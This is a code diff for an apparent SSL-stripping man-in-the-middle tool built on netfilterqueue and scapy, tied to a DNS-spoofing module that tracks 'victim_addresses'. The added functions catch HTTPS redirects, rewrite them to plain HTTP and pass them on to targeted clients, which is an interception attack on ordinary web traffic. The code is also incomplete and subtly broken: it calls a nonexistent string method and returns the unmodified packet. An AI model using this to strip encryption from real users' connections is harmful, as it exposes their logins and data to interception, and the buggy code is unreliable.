@@ -1,5 +1,6 @@
 import netfilterqueue
 import scapy.all as scapy
+import dns_spoofing
 
 #https://venafi.com/blog/what-are-ssl-stripping-attacks/
 #Typical sequence of events
@@ -11,34 +12,52 @@ import scapy.all as scapy
 # we want to intercept 2., then initiate https ourselves, and send http to the user
 
 
-#TODO method for keeping track of ssl stripped sessions/victim-server pairs/idk?
+#TODO code for keeping track of ssl stripped sessions/victim-server pairs/idk?
 
 #Check whether this is a redirect to https
 def https_switching_request(scapy_packet):
     if scapy_packet.haslayer(scapy.HTTPResponse):
-        http_layer = scapy_packet.getlayer(scapy.HTTPResponse)
-        if http_layer.Location.contains('https://'):
-            if http_layer.Status_Code[0] == "3": #3xx status code is for redirection (wikipedia)
-                return True
+        http_layer = scapy_packet.getlayer(scapy.HTTPResponse)#https://github.com/secdev/scapy/blob/master/scapy/layers/http.py#L540-L581
+        
+        https = http_layer.Location.contains('https://') 
+        redirect = http_layer.Status_Code[0] == "3" #3xx status code is for redirection (wikipedia)
+        
+        return https and redirect #if a redirect to https
     return False
 
-# client <--http--> us <--https--> server
+# whether there already is a "client <--http--> us <--https--> server" situation
 def existing_connection(scapy_packet):
     #TODO
     return False
 
 def to_server(scapy_packet):
-    #TODO
+    ip_layer = scapy_packet.getlayer(scapy.IP)
+    
+    if ip_layer.src in dns_spoofing.victim_addresses.keys():
+        return True
+    
     return False
+
+#Transforms an https redirect to normal http response
+def strip_https_redirect(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    
+    http_layer = scapy_packet.getlayer(scapy.HTTPResponse)
+    http_layer.Location = http_layer.Location.replace('https://', 'http://')
+    http_layer.Status_Code = "200"
+
+    return packet
 
 
 #alternative proxy method to just dns spoofing
-def proxy_just_ssl(packet):
+def proxy_strip_only(packet):
     scapy_packet = scapy.IP(packet.get_payload())
 
     if https_switching_request(scapy_packet):
-        print("a")
-        #TODO transform to packet without switching request and send to client
+        #strip https redirect and send http response to client
+        stripped_packet = strip_https_redirect(packet)
+        packet.set_payload(str(stripped_packet)) #conversion from https://stackoverflow.com/questions/46645142/modify-with-scapy-and-netfilterqueue
+        packet.accept()
 
         #TODO establish https with server
         return
